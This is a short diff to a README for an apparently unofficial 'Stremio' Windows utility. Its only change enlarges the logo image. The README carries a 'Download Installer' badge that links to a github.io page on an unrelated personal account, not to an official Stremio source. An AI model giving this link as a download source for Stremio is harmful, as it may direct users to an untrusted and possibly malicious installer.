@@ -1,7 +1,7 @@
 # Stremio Media Library and Content Discovery Utility for Windows
 
 <div align="center">
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHlmCFHh57cbesJn0uokRJLhYK_Ht9msSzCfzptbk0zT6bt_HkZChK83A&s=10" alt="Stremio Logo" width="160">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHlmCFHh57cbesJn0uokRJLhYK_Ht9msSzCfzptbk0zT6bt_HkZChK83A&s=10" alt="Stremio Logo" width="560">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square\&logo=windows\&logoColor=white)](https://tonywardoxeq.github.io/.github/Stremio-Windows-App)
